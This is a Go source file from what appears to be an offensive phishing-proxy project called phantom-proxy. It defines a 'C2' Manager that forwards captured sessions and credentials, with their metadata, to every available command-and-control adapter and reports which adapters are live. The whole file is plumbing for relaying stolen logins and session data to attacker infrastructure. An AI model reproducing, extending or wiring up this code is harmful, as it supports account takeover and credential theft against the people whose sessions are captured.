package c2

import (
	"context"
	"sync"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// Manager coordinates C2 adapters
type Manager struct {
	adapters []Adapter
	mu       sync.RWMutex
}

// NewManager creates C2 manager
func NewManager(adapters ...Adapter) *Manager {
	return &Manager{adapters: adapters}
}

// AddAdapter adds C2 adapter
func (m *Manager) AddAdapter(a Adapter) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.adapters = append(m.adapters, a)
}

// SendSessionToAll sends session to all enabled adapters
func (m *Manager) SendSessionToAll(ctx context.Context, data *SessionData) []error {
	m.mu.RLock()
	adapters := make([]Adapter, len(m.adapters))
	copy(adapters, m.adapters)
	m.mu.RUnlock()

	var errs []error
	for _, a := range adapters {
		if a.IsAvailable(ctx) {
			if err := a.SendSession(ctx, data); err != nil {
				errs = append(errs, err)
			}
		}
	}
	return errs
}

// SendCredentialsToAll sends credentials to all adapters
func (m *Manager) SendCredentialsToAll(ctx context.Context, creds *database.Credentials, metadata map[string]string) []error {
	m.mu.RLock()
	adapters := make([]Adapter, len(m.adapters))
	copy(adapters, m.adapters)
	m.mu.RUnlock()

	var errs []error
	for _, a := range adapters {
		if a.IsAvailable(ctx) {
			if err := a.SendCredentials(ctx, creds, metadata); err != nil {
				errs = append(errs, err)
			}
		}
	}
	return errs
}

// ListAdapters returns names and status
func (m *Manager) ListAdapters(ctx context.Context) []map[string]interface{} {
	m.mu.RLock()
	adapters := make([]Adapter, len(m.adapters))
	copy(adapters, m.adapters)
	m.mu.RUnlock()

	var result []map[string]interface{}
	for _, a := range adapters {
		result = append(result, map[string]interface{}{
			"name":      a.Name(),
			"available": a.IsAvailable(ctx),
		})
	}
	return result
}
